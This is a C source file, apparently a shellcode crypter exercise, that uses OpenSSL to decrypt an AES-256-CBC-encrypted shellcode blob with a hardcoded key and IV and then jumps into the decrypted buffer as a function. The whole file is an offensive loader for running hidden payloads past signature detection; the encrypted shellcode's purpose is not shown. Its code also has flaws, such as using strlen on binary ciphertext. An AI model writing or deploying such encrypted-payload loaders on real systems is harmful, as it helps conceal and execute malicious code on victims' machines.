#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>

	
/* Error Handling */
void handleErrors(void)
{
  ERR_print_errors_fp(stderr);
  abort();
}


/* Decription Function */


int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
  unsigned char *iv, unsigned char *plaintext)
{
  EVP_CIPHER_CTX *ctx;

  int len;

  int plaintext_len;

  /* Create and initialise the context */
  if(!(ctx = EVP_CIPHER_CTX_new())) handleErrors();
 
  /* Initialise the decryption operation. IMPORTANT - ensure you use a key
   * and IV size appropriate for your cipher
   * In this example we are using 256 bit AES (i.e. a 256 bit key). The
   * IV size for *most* modes is the same as the block size. For AES this
   * is 128 bits */
  if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
    handleErrors();

  /* Provide the message to be decrypted, and obtain the plaintext output.
   * EVP_DecryptUpdate can be called multiple times if necessary
   */
  if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
    handleErrors();
  plaintext_len = len;

  /* Finalise the decryption. Further plaintext bytes may be written at
   * this stage.
   */
  if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len)) handleErrors();
  plaintext_len += len;

  /* Clean up */
  EVP_CIPHER_CTX_free(ctx);

  return plaintext_len;
}


/* Print Shellcode */
void print_shellcode(unsigned char *shellcode)
{
  for (int i = 0; i < strlen(shellcode); i++) {

      printf("\\x%02x", shellcode[i]);
  }
    printf("\n");

}

int main (void)
{

  /* A 256 bit key */
  unsigned char *key = (unsigned char *)"01234567890123456789012345678901";

  /* A 128 bit IV */
  unsigned char *iv = (unsigned char *)"0123456789012345";

  /* Shellcode to decrypt */

  unsigned char *ciphertext =
                (unsigned char *)"\x88\x44\x5d\xc6\xa1\xbe\x47\xa5\x48\xf9\x1b\xdd\x1a\x4c\xd3\x18\x2f\xa5\xdb\x88\xde\xd0\xcb\x6c\x4e\x53\x7f\x6a\xc9\xac\x43\x3e\xe7\x13\xd2\x54\x6c\x4c\x14\xad\x97\x6f\xce\x60\x57\xb1\xc6\x9f";

  /* Buffer for the decrypted shellcode */
  
  unsigned char decryptedtext[128];

  int decryptedtext_len, ciphertext_len;
 
  printf("Shellcode Lentgh: %d\n", strlen(ciphertext));

  ciphertext_len = strlen((char *)ciphertext);

  //printf("Shellcode Lentgh: %d\n", strlen((char *)ciphertext));

  /* Decrypt the ciphertext */ 

  decryptedtext_len = decrypt(ciphertext, ciphertext_len, key, iv, decryptedtext);

  decryptedtext[decryptedtext_len] = '\0';


/* Execute the shellcode */

  int (*ret)() = (int(*)())decryptedtext;

  ret();
  
  
//  printf("Shellcode Length:  %d\n", strlen(plaintext));


 
}
